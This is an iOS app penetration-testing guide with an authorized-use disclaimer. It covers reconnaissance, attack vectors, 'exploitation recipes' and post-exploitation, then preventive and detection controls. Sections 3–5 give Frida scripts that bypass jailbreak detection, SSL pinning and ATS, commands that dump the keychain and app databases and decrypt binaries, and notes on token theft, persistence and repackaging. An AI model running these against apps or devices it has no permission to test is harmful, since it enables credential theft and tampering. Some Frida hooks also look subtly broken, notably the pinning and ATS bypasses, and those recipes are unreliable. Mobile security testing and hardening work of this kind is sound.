# iOS Security

> [!NOTE]
> This document is for authorized security testing, educational purposes, and defensive engineering only. Do not use these techniques against applications you do not own or have explicit permission to test.

## 1. Overview

iOS is a Unix-based mobile OS with a defense-in-depth architecture:

- **App Sandbox.** Each app runs in its own container (`/var/mobile/Containers/Data/Application/<UUID>/`). It cannot read other apps' data without explicit entitlements.
- **Code signing.** Every binary must be signed by Apple (App Store) or by an enterprise/development certificate. Unsigned code does not run.
- **Data Protection.** Files can be encrypted with keys derived from the device passcode and the Secure Enclave. Classes: `NSFileProtectionComplete`, `...CompleteUnlessOpen`, `...UntilFirstUserAuthentication`, `...None`.
- **Keychain.** Encrypted credential store, protected by the Secure Enclave. Access classes: `kSecAttrAccessibleWhenUnlocked`, `...AfterFirstUnlock`, `...WhenPasscodeSetThisDeviceOnly`, etc.
- **Entitlements.** Capabilities granted to a signed app (e.g. `keychain-access-groups`, `com.apple.security.application-groups`, `get-task-allow`). `get-task-allow` = debuggable.
- **ASLR + PAC (Pointer Authentication Codes, arm64e).** Exploit mitigations. PAC signs pointers; bypass requires a signing gadget.

**What this means for security testing:**

- Without a jailbroken device (or a Corellium/Frida-enabled setup), deep testing is limited. Static analysis still works.
- The attack surface is the app code + the IPC surface (URL schemes, universal links, XPC on macOS) + the backend API + the Keychain/Data Protection configuration.
- The main defensive controls are: correct Keychain access classes, Data Protection classes, ATS (App Transport Security), certificate pinning, code signing, App Attest / DeviceCheck, and RASP.

## 2. Reconnaissance / Enumeration

### 2.1 IPA structure

An IPA is a ZIP archive. Key entries:

| Path | Purpose |
|------|---------|
| `Payload/<App>.app/Info.plist` | App metadata (bundle ID, version, URL schemes, ATS settings) |
| `Payload/<App>.app/<App>` | Mach-O binary |
| `Payload/<App>.app/embedded.mobileprovision` | Provisioning profile (entitlements, team ID, expiration) |
| `Payload/<App>.app/Frameworks/` | Embedded frameworks (Swift runtime, third-party SDKs) |
| `Payload/<App>.app/PlugIns/` | App extensions (share, widget, keyboard) |
| `Payload/<App>.app/*.lproj/` | Localized strings |
| `Payload/<App>.app/Assets.car` | Compiled asset catalog |

### 2.2 Static analysis toolkit

```bash
# Unzip IPA
unzip app.ipa -d app-decoded

# Inspect Info.plist
plutil -p app-decoded/Payload/App.app/Info.plist

# Inspect entitlements (from the provisioning profile or the binary)
codesign -d --entitlements :- app-decoded/Payload/App.app/App

# Dump Objective-C class info (on a decrypted binary)
class-dump app-decoded/Payload/App.app/App > classes.h

# Disassemble with Hopper / Ghidra / IDA
# (GUI tools; no CLI equivalent that matches their output quality)
```

**Expected output:** Readable `Info.plist`, entitlements XML, Objective-C headers with class and method names.

### 2.3 Info.plist inspection

Look for:

- `CFBundleURLTypes` - custom URL schemes.
- `com.apple.developer.associated-domains` - universal links.
- `NSAppTransportSecurity` - ATS exceptions (cleartext allowed?).
- `get-task-allow` (in entitlements) - debuggable if `true`.
- `UIFileSharingEnabled` - iTunes/Finder file sharing.
- `LSApplicationQueriesSchemes` - which apps the app can query.

### 2.4 Binary inspection

```bash
# Check architecture, PIE, stack canary, ARC
otool -hv app-decoded/Payload/App.app/App
otool -l app-decoded/Payload/App.app/App | grep -E "PIE|stack_chk|objc_release"

# Check code signature
codesign -dv --verbose=4 app-decoded/Payload/App.app/App

# Check encryption (cryptid 1 = encrypted, 0 = decrypted)
otool -l app-decoded/Payload/App.app/App | grep -A4 LC_ENCRYPTION_INFO
```

**Expected output:** `PIE` flag set, `__stack_chk` symbols present, `cryptid 0` (if the binary was decrypted on a jailbroken device), valid signature.

### 2.5 Dynamic reconnaissance

```bash
# Install on a jailbroken device (or use a Corellium instance)
ideviceinstaller -i app.ipa

# List installed apps
ideviceinstaller -l

# Frida: list running processes
frida-ps -U

# Frida: spawn and attach
frida -U -f com.example.app --no-pause
```

**Expected output:** App installed; `frida-ps` lists the app's PID; Frida prompt attaches.

## 3. Common Attack Vectors

### 3.1 Insecure data storage

Data stored in plaintext in the app container:

- `NSUserDefaults` (plist in `Library/Preferences/`).
- `Library/Caches/` (often not protected).
- `Documents/` (if `UIFileSharingEnabled` is true, visible in Finder).
- SQLite / Core Data databases without encryption.
- Keychain items with weak accessibility (`kSecAttrAccessibleAlways`, deprecated).

```bash
# On a jailbroken device, browse the app container
find /var/mobile/Containers/Data/Application/<UUID>/ -type f 2>/dev/null
plutil -p /var/mobile/Containers/Data/Application/<UUID>/Library/Preferences/com.example.app.plist
```

**Expected output:** Plaintext tokens, API keys, PII.

### 3.2 Keychain misconfigurations

Items stored with weak access classes are readable after the first unlock (or even when locked, for `Always`).

```bash
# On a jailbroken device, dump the keychain
./keychain_dumper -a
```

**Expected output:** Plaintext credentials, tokens, certificates.

### 3.3 Insecure communication (ATS exceptions)

If `NSAllowsArbitraryLoads` is `true`, the app can talk HTTP. If pinning is absent, `mitmproxy` with a user-installed CA decrypts traffic.

```bash
# Install mitmproxy CA on the device (Settings > General > About > Certificate Trust Settings)
# Then intercept traffic
mitmproxy --mode regular --listen-port 8080
```

**Expected output:** Decrypted HTTPS traffic (if pinning is absent or bypassed).

### 3.4 URL scheme hijacking

Custom schemes (`myapp://`) can be registered by any app. If two apps register the same scheme, iOS behavior is undefined (usually the first installed wins).

```bash
# Trigger a URL scheme
xcrun simctl openurl booted "myapp://reset?token=attacker"
```

**Expected output:** App opens the handler. Test whether the handler validates the token, the user, and the action server-side.

### 3.5 Jailbreak detection bypass

Common checks: `Cydia` installed, `/Applications/Cydia.app`, `fork()` success, `system()` success, suspicious URL schemes (`cydia://`), writable `/private/`.

```javascript
// Frida: hook common jailbreak checks
if (ObjC.available) {
    var NSFileManager = ObjC.classes.NSFileManager;
    var fileExistsAtPath = NSFileManager['- fileExistsAtPath:'];
    Interceptor.attach(fileExistsAtPath.implementation, {
        onEnter: function(args) {
            var path = ObjC.Object(args[2]).toString();
            if (path.indexOf("Cydia") !== -1 || path.indexOf("jailbreak") !== -1) {
                console.log("[*] Blocked fileExistsAtPath: " + path);
                this.blocked = true;
            }
        },
        onLeave: function(retval) {
            if (this.blocked) { retval.replace(0); }
        }
    });
}
```

**Expected output:** `[*] Blocked fileExistsAtPath: /Applications/Cydia.app`; app starts without jailbreak warning.## 4. Exploitation Recipes

### 4.1 Bypass jailbreak detection (Frida, file-based)

```javascript
// Block file existence checks for common jailbreak artifacts
if (ObjC.available) {
    var NSFileManager = ObjC.classes.NSFileManager;
    var fileExistsAtPath = NSFileManager['- fileExistsAtPath:'];
    Interceptor.attach(fileExistsAtPath.implementation, {
        onEnter: function(args) {
            var path = ObjC.Object(args[2]).toString();
            if (path.indexOf("Cydia") !== -1 ||
                path.indexOf("/bin/bash") !== -1 ||
                path.indexOf("/usr/sbin/sshd") !== -1 ||
                path.indexOf("MobileSubstrate") !== -1) {
                console.log("[*] Blocked: " + path);
                this.blocked = true;
            }
        },
        onLeave: function(retval) {
            if (this.blocked) { retval.replace(0); }
        }
    });
}
```

**Expected output:** `[*] Blocked: /Applications/Cydia.app`; app starts without warning.

### 4.2 Bypass SSL pinning (TrustKit / AFNetworking / NSURLSession)

Pinpoint the pinning implementation (TrustKit, AFNetworking, or custom `NSURLSessionDelegate`), then hook the validation method.

```javascript
// Generic NSURLSession delegate hook (covers most custom pinning)
if (ObjC.available) {
    var NSURLSession = ObjC.classes.NSURLSession;
    var didReceiveChallenge = NSURLSession['- URLSession:didReceiveChallenge:completionHandler:'];
    if (didReceiveChallenge) {
        Interceptor.attach(didReceiveChallenge.implementation, {
            onEnter: function(args) {
                console.log("[*] URLSession challenge intercepted");
                // Force the completion handler to use the default handling
                var completionHandler = new ObjC.Block(args[4]);
                var original = completionHandler.implementation;
                completionHandler.implementation = function(disposition, credential) {
                    // 0 = useCredential, 1 = performDefaultHandling, 2 = cancelAuthenticationChallenge
                    original(1, NULL);
                };
            }
        });
    }
}
```

**Expected output:** `[*] URLSession challenge intercepted`; `mitmproxy` shows decrypted HTTPS.

### 4.3 Extract app data on jailbroken device

```bash
# Find the app container
CONTAINER=$(find /var/mobile/Containers/Data/Application -name "com.example.app" -type d 2>/dev/null | head -1)
echo "Container: $CONTAINER"

# Dump preferences
plutil -p "$CONTAINER/Library/Preferences/com.example.app.plist"

# Dump SQLite
sqlite3 "$CONTAINER/Library/Application Support/app.db" ".tables"
sqlite3 "$CONTAINER/Library/Application Support/app.db" "SELECT * FROM users;"
```

**Expected output:** Plaintext tokens, user rows.

### 4.4 Dump the keychain (jailbroken device)

```bash
# keychain_dumper from iphone-dataprotection
./keychain_dumper -a > keychain.txt
grep -iE "password|token|account" keychain.txt
```

**Expected output:** Plaintext keychain items (service, account, data).

### 4.5 Decrypt the binary (jailbroken device)

```bash
# frida-ios-dump (uses Frida to dump the decrypted Mach-O from memory)
frida-ios-dump -u com.example.app -o /tmp/decrypted.ipa

# Or use dumpdecrypted.dylib manually
DYLD_INSERT_LIBRARIES=dumpdecrypted.dylib /var/containers/Bundle/Application/<UUID>/App.app/App
```

**Expected output:** Decrypted IPA / Mach-O on disk; `class-dump` now produces headers.

### 4.6 Bypass ATS (App Transport Security) at runtime

If ATS blocks HTTP, hook `NSURLSessionConfiguration` to allow arbitrary loads.

```javascript
if (ObjC.available) {
    var NSURLSessionConfiguration = ObjC.classes.NSURLSessionConfiguration;
    var defaultSessionConfiguration = NSURLSessionConfiguration['+ defaultSessionConfiguration'];
    Interceptor.attach(defaultSessionConfiguration.implementation, {
        onLeave: function(retval) {
            var config = new ObjC.Object(retval);
            config.setAllowsArbitraryLoads_(1);
            console.log("[*] ATS bypassed on session configuration");
        }
    });
}
```

**Expected output:** `[*] ATS bypassed on session configuration`; HTTP requests now succeed.

## 5. Post-Exploitation

- **Data exfiltration:** pull the app container (jailbroken) or use Frida to dump `NSUserDefaults`, SQLite, and the Keychain.
- **Token theft:** extract session tokens from `NSUserDefaults`, SQLite, or memory (Frida `ObjC.classes.<Class>['- <field>']`).
- **Backend pivot:** replay the token against the API (see `01 Mobile Security Fundamentals.md`, section 5.3).
- **Persistence:** on a jailbroken device, install a LaunchDaemon or a tweak (Theos/substrate) that hooks the app on every start. On non-jailbroken, no reliable persistence without user interaction.
- **Repackaging:** unzip the IPA, patch the binary (or `Info.plist`), re-sign with a development/enterprise certificate (`codesign -f -s "iPhone Developer: ..."`), install with `ideviceinstaller`. Used to bypass license checks, inject code, or distribute malware (illegal outside authorized testing).

## 6. Preventive Controls (AppSec)

| Risk | Control |
|------|---------|
| Insecure data storage | Keychain with `kSecAttrAccessibleWhenUnlockedThisDeviceOnly`; Data Protection class `NSFileProtectionComplete`; avoid `NSUserDefaults` for secrets |
| Keychain misconfiguration | Never use `kSecAttrAccessibleAlways`; use `...ThisDeviceOnly` for device-bound secrets |
| Insecure communication | ATS strict (`NSAllowsArbitraryLoads=false`); TLS 1.2+; certificate pinning (public-key pinning, TrustKit or custom) |
| URL scheme hijacking | Universal Links (`com.apple.developer.associated-domains`) instead of custom schemes; validate token + user + action server-side |
| Jailbreak detection | Combine multiple signals (Cydia path, `fork()` success, writable `/private/`, suspicious URL schemes); degrade features, do not hard-block |
| Reverse engineering | Swift/ObjC symbol stripping; `strip -x`; obfuscation tools (SwiftShield, Obfuscator-LLVM) |
| Tampering | App Attest (iOS 14+) or DeviceCheck; server validates the attestation |
| Debuggable build | `get-task-allow=false` in distribution entitlements |
| File sharing | `UIFileSharingEnabled=false` unless required |

## 7. Detection Controls (AppSec)

- **App Attest (iOS 14+):** server-side attestation of the app's integrity (signed by Apple, tied to the device). Stronger than DeviceCheck (which only attests a device bit).
- **DeviceCheck:** two bits per device, useful for fraud / abuse signals.
- **RASP:** runtime detection of Frida (`frida-server` on jailbroken device, `frida` named pipes), Cydia, suspicious dylibs, debugger attachment (`ptrace` `PT_DENY_ATTACH`). Respond by degrading features, not hard-blocking.
- **Pinning failure telemetry:** log pinning failures to the backend (rate-limited, no sensitive data).
- **Server-side anomaly detection:** impossible travel, unusual API call patterns, replay detection.
- **Log hygiene:** never log tokens, PII, or full URLs with query strings.

## 8. Verification (AppSec)

- **MASVS mapping:** STORAGE (Keychain, Data Protection), CRYPTO (algorithms, key sizes), AUTH (biometric binding, token lifetime), NETWORK (ATS, pinning), PLATFORM (URL schemes, universal links, WebView), CODE (symbol stripping, `get-task-allow`), RESILIENCE (App Attest, jailbreak detection), PRIVACY (data minimization).
- **MASTG tests:** run the iOS test cases in MASTG for each MASVS category.
- **Automated:** MobSF static scan in CI (IPA support); `otool` / `codesign` checks in CI.
- **Manual pentest:** jailbroken device or Corellium instance with Frida; `mitmproxy` for traffic; `class-dump` + Hopper/Ghidra for static.

## 9. References

- iOS Security Guide - https://support.apple.com/guide/security/welcome/web
- App Transport Security - https://developer.apple.com/documentation/security/preventing_insecure_network_connections
- Keychain Services - https://developer.apple.com/documentation/security/keychain_services
- Data Protection - https://developer.apple.com/documentation/uikit/protecting_the_user_s_privacy/encrypting_your_app_s_files
- App Attest - https://developer.apple.com/documentation/devicecheck/establishing_your_app_s_integrity
- DeviceCheck - https://developer.apple.com/documentation/devicecheck
- OWASP MASTG (iOS) - https://mas.owasp.org/MASTG/iOS/
- OWASP MASVS - https://mas.owasp.org/MASVS/
- Frida (iOS) - https://frida.re/docs/ios/
- frida-ios-dump - https://github.com/AloneMonkey/frida-ios-dump
- class-dump - https://github.com/nygard/class-dump
- keychain_dumper - https://github.com/ptoomey3/Keychain-Dumper
- MobSF - https://github.com/MobSF/Mobile-Security-Framework-MobSF